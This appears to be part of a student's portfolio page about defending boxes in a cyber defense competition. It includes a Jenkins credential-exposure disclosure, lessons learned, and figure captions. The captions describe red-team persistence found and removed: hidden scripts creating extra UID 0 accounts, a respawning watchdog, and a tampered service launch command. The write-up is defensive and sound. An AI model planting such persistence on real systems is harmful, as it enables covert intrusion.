+        <p>We were unable to provide items 4 and 5.</p>
+
+        <h4>Vulnerability disclosure #467337</h4>
+        <p>We filed the Jenkins Pipeline: Multibranch finding on the Cyber Compliance Department's vulnerability disclosure form.</p>
+        <table>
+          <thead><tr><th>Field</th><th>Value</th></tr></thead>
+          <tbody>
+            <tr><td>Title</td><td>Unauthenticated Jenkins Plugin</td></tr>
+            <tr><td>Impact</td><td>High</td></tr>
+            <tr><td>Likelihood</td><td>Medium</td></tr>
+            <tr><td>CVSS score</td><td>6.5</td></tr>
+            <tr><td>Overall risk</td><td>High</td></tr>
+            <tr><td>Vector</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</td></tr>
+            <tr><td>MITRE ATT&amp;CK technique</td><td>T1078 Valid Accounts</td></tr>
+            <tr><td>MITRE ATT&amp;CK mitigation</td><td>M1032 Multi-factor Authentication</td></tr>
+            <tr><td>Affected host</td><td>172.16.26.30</td></tr>
+          </tbody>
+        </table>
+        <p>
+          <strong>Impact as submitted.</strong> The vulnerability lets a low-privilege Jenkins user read System-scoped credentials,
+          which can include SCM tokens, cloud keys and SSH keys.
+        </p>
+        <p><strong>Remediation as submitted.</strong> Update the plugin through the Jenkins plugin manager.</p>
+        <p><strong>What I'd fix on resubmission.</strong></p>
+        <ul>
+          <li>The title says unauthenticated, but the vector uses PR:L because the attack needs a low-privilege login. Rename it to something like "Jenkins Pipeline: Multibranch credential exposure".</li>
+          <li>The form's field is labeled CVSS v4.0, but the vector is CVSS v3.1, which is what the 6.5 comes from.</li>
+          <li>Remediation should also rotate every System-scoped credential, since they may already have been read, and restrict who can create or configure jobs.</li>
+        </ul>
+
+        <h4>Song list</h4>
+        <p>A lighter inject asked for new music. We replied with seven picks:</p>
+        <table>
+          <thead><tr><th>Artist</th><th>Song</th></tr></thead>
+          <tbody>
+            <tr><td>Mili</td><td>Through Patches of Violet</td></tr>
+            <tr><td>Juice WRLD</td><td>Party by myself</td></tr>
+            <tr><td>Project Pat</td><td>Life we Live</td></tr>
+            <tr><td>Kanye</td><td>Flashing lights</td></tr>
+            <tr><td>Mitski</td><td>Washing machine</td></tr>
+            <tr><td>Modest Mouse</td><td>Black cadillacs</td></tr>
+            <tr><td>Kid Cudi</td><td>By design</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Results and lessons</h3>
+        <ul>
+          <li><strong>Scoring access beats IP restriction.</strong> The scoring engine shares IP ranges with Red Team, so restricting RDP by source would have failed my own check. Strong passwords did more than IP rules.</li>
+          <li><strong>Pre-existing rules matter.</strong> Windows Firewall allows traffic if any rule matches, so the built-in RDP rule made my restricted rule pointless. Default-deny does not remove old allow rules.</li>
+          <li><strong>One account, two passwords.</strong> jmoney had a Windows login and a separate Jenkins login. Both had to change, and the scoreboard had to match.</li>
+          <li><strong>Back up before you touch anything.</strong> A clean copy on an out-of-scope box is cheaper than a revert.</li>
+          <li><strong>Read the log, not the wrapper error.</strong> PowerShell said only that MariaDB could not start. The error log named the real cause, a stray argument on the service command.</li>
+          <li><strong>A 0 KB file is not a backup.</strong> Check the size and the first lines before copying a dump anywhere.</li>
+          <li><strong>Check the prompt before you paste.</strong> I ran Windows commands on blackbox and shell commands inside the MariaDB prompt, which cost time.</li>
+          <li><strong>Planted persistence hides among real names.</strong> The fake services sat next to ssh, apache2 and cron. File dates and what each one actually runs separated them.</li>
+          <li><strong>Stop the respawner first.</strong> A watchdog loop recreated the fake root accounts every five minutes, so deleting the accounts before stopping the loop would have changed nothing.</li>
+          <li><strong>Stage the restore file before any DROP.</strong> Dump the live database, confirm the backup is on the box and not empty, then drop.</li>
+          <li><strong>Elevate first, and match the tool to the code.</strong> Stop-Service failed from a PowerShell ISE that was not running as administrator, and Groovy written for the Jenkins Script Console cannot run in PowerShell.</li>
+          <li><strong>Redact before you share.</strong> My Jenkins reset scripts held a password hash and a plaintext password, so blur those in any screenshot you publish.</li>
+        </ul>
+
+        <h3>Appendix: screenshots</h3>
+        <p>Screenshots are grouped by box.</p>
+
+        <h4>Assembly (Jenkins)</h4>
+        <p><strong>Figure 1.</strong> Scoreboard detail for assembly at 11:15:58 AM. The jenkins check is DOWN with "Jenkins rejected the scoring account's sign-in" and a redirect to /loginError, while rdp is UP.</p>
+        <img src="photos/fig01.png" alt="Figure 1: scoreboard, Jenkins down and RDP up on assembly" />
+        <p><strong>Figure 2.</strong> A fake user, jomoney, in the Jenkins dashboard next to the real jmoney and plinktern, being deleted through the "Delete Jenkins user 'jomoney'?" dialog.</p>
+        <img src="photos/fig02.png" alt="Figure 2: deleting the fake jomoney Jenkins user" />
+        <p><strong>Figure 3.</strong> The Jenkins service Stopped, with its launch command ending in extra text (BUT EVIL). Below it, the registry ImagePath fix and the service Running again.</p>
+        <img src="photos/fig03.png" alt="Figure 3: Jenkins service tampering and registry fix" />
+        <p><strong>Figure 4.</strong> Manage Jenkins warnings: advisories for Gradle Plugin 2.19.1252, Pipeline: Multibranch 841 and Pipeline: Groovy Libraries 805, plus the built-in node warning, the CSP notice and the offered upgrade to 2.580.1.</p>
+        <img src="photos/fig04.png" alt="Figure 4: Manage Jenkins plugin and version warnings" />
+        <p><strong>Figure 5.</strong> Scoreboard for teams 1 to 35 at 2:19:31 PM with Team 26 highlighted. Team 26 showed every scored service up.</p>
+        <img src="photos/fig05.png" alt="Figure 5: scoreboard with Team 26 all services up" />
+
+        <h4>Manifest (MariaDB)</h4>
+        <p><strong>Figure 6.</strong> mariadb-dump run as plinktern failing with Errcode 2 (No such file or directory) because C:\backup was missing.</p>
+        <img src="photos/fig06.png" alt="Figure 6: mariadb-dump failing, C:\backup missing" />
+        <p><strong>Figure 7.</strong> C:\backup holding a plinkcom.sql that is 0 bytes, which is not a usable backup.</p>
+        <img src="photos/fig07.png" alt="Figure 7: 0-byte plinkcom.sql backup" />
+        <p><strong>Figure 8.</strong> Start-Service on MariaDB refusing to start.</p>
+        <img src="photos/fig08.png" alt="Figure 8: MariaDB service refusing to start" />
+        <p><strong>Figure 9.</strong> Port check: mysqld (PID 5172) listening on 0.0.0.0:3306 and ::, with no enabled inbound block rules.</p>
+        <img src="photos/fig09.png" alt="Figure 9: mysqld listening on 3306 after restart" />
+
+        <h4>Blackbox (backup box)</h4>
+        <p><strong>Figure 10.</strong> My failed first attempts on blackbox: mysqldump not found (the box runs Linux Mint 22, so the Windows-side steps did not belong there), a mistyped apt command, an scp to a mistyped address (172.16.t.5) and a missing ~/backups folder.</p>
+        <img src="photos/fig10a.png" alt="Figure 10a: failed backup attempts on blackbox" />
+        <img src="photos/fig10b.png" alt="Figure 10b: failed backup attempts on blackbox" />
+        <p><strong>Figure 11.</strong> ~/bk with one folder per box (assembly, guidance, ignition, manifest) and plinkcom.sql in manifest/backup. The listing does not show the file size.</p>
+        <img src="photos/fig11.png" alt="Figure 11: organized backups on blackbox" />
+
+        <h4>Guidance (Apache and persistence)</h4>
+        <p><strong>Figure 12.</strong> passwd failing with "Authentication token manipulation error" and the "the horse says: no" shell hook, right after login (banner time 18:26:39 UTC, 0 users logged in).</p>
+        <img src="photos/fig12.png" alt="Figure 12: passwd failure and horse-says-no shell hook" />
+        <p><strong>Figure 13.</strong> A message in the terminal telling me to ping a named user in #the-walls or have my box deleted, then the passwd checks: type -a, file, ls -l and dpkg -V were clean, and lsattr showed no immutable flags.</p>
+        <img src="photos/fig13.png" alt="Figure 13: terminal threat message and passwd integrity checks" />
+        <p><strong>Figure 14.</strong> ports.conf and the top of apache2.conf, both stock Debian defaults.</p>
+        <img src="photos/fig14a.png" alt="Figure 14a: ports.conf, stock Debian default" />
+        <img src="photos/fig14b.png" alt="Figure 14b: apache2.conf, stock Debian default" />
+        <p><strong>Figure 15.</strong> ss and apache2ctl -M showing only port 80 listening and no ssl module, so nothing served TLS.</p>
+        <img src="photos/fig15.png" alt="Figure 15: only port 80 listening, no TLS module" />
+        <p><strong>Figure 16.</strong> ls -la /usr/local/bin showing hidden scripts dated Oct 17 (the .kernguard.py at 15:52, the rest at 17:42), then cat of .sysmaint.sh creating four extra UID 0 accounts.</p>
+        <img src="photos/fig16.png" alt="Figure 16: hidden persistence scripts and .sysmaint.sh contents" />
+        <p><strong>Figure 17.</strong> plinkcom.conf mid-edit, showing the stray closing Directory tag that would have failed configtest and the old dotfile pattern.</p>
+        <img src="photos/fig17.png" alt="Figure 17: plinkcom.conf before the fix" />
+        <p><strong>Figure 18.</strong> plinkcom.conf after the fix: uploads block with AllowOverride None, php_admin_flag engine off and the .txt-only FilesMatch rules, plus the corrected dotfile rule.</p>
+        <img src="photos/fig18.png" alt="Figure 18: plinkcom.conf after the fix" />
+
+        <h4>Assembly: Jenkins password reset attempts</h4>
+        <p><strong>Figure 19.</strong> The Jenkins account page for plinktern, with the description set to "hi red guys", beside an administrator PowerShell session. The session runs the CCDC-Script tools installer (Sysinternals: Process Explorer, Autoruns, Sigcheck, TCPView), runs Set-LocalUser on jmoney with a secure password prompt three times (the last one cancelled), then fails to run jenkins-cli.jar because the file is missing.</p>
+        <img src="photos/fig19.png" alt="Figure 19: Jenkins account tampered to 'hi red guys', beside a reset attempt" />
+        <p class="withheld"><strong>Figures 20 to 23</strong> are held back until the password hash and plaintext password in them are blurred: a PowerShell ISE script that stops the Jenkins service and rewrites plinktern's passwordHash in config.xml (Figure 20), a second version with two fixed config.xml paths (Figure 21), a third run from an ISE that was not elevated and could not open the service (Figure 22), and Groovy Script Console code pasted into PowerShell by mistake (Figure 23).</p>
+
+        <p>
+          <a href="https://github.com/ParkerRubin" target="_blank">View more projects on GitHub</a>
+        </p>
+      </div>
+
+    </main>
+    <script src="../../assets/js/script.js"></script>
+  </body>
+</html>
